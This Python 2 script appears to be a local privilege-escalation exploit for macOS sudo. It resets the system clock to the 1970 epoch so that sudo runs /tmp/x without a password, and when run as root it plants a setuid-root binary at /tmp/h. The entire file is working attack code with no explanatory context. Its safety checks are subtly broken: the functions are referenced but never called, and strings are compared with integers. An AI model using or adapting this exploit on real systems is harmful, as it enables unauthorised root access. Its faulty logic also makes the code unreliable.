#!/usr/bin/env python

import os
import sys
import stat
import subprocess


BIN_PATH = "systemsetup"
X_PATH   = "/tmp/x"
GROUP    = "admin"

def get_w00t():
    cmd = "%s -setusingnetworktime Off -settimezone GMT -setdate 01:01:1970 -settime 00:00; sudo %s" % (BIN_PATH, X_PATH)
    proc = subprocess.Popen('bash', shell=False, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
    proc.stdin.write(cmd)

def run_cmd(cmd):
    proc = subprocess.Popen(cmd.split(" "), stdin=subprocess.PIPE, stdout=subprocess.PIPE)
    out, err = proc.communicate()

    return out, err

def sudo_vulnerable():
    out, err = run_cmd("sudo -V")

    l = out.split("\n")[0]
    version_string = l.split(" ")[2]
    major, minor, bugfix = version_string.split(".")
    bugfix, p = bugfix.split("p")

    if (major != 1 or (minor < 6 and minor > 8)):
        return 0
    if (minor == 7 and (bugfix > 10 or p > 6)):
        return 0
    if (minor == 8 and (bugfix > 6 or p > 6)):
        return 0

    return 1

def user_admin():
    out, err = run_cmd("groups")
    if GROUP not in out.split(" "):
        return 0

    return 1

if __name__ == "__main__":
    # check if we got privs
    if os.geteuid() == 0:
        os.setuid(0);
        os.chown("/tmp/h", 0, 0);
        os.chmod("/tmp/h", stat.S_ISUID | stat.S_IRWXU | stat.S_IRGRP | stat.S_IXGRP | stat.S_IROTH | stat.S_IXOTH);

    # check sudo version
    if not sudo_vulnerable:
        print "[-] Not vulnerable"
        sys.exit(0)

    # check if user is admin
    if not user_admin:
        print "[-] User is not part of the admin group"
        sys.exit(0)

    # reset timestamp and run sudo command
    run_cmd("sudo -k")
    get_w00t()
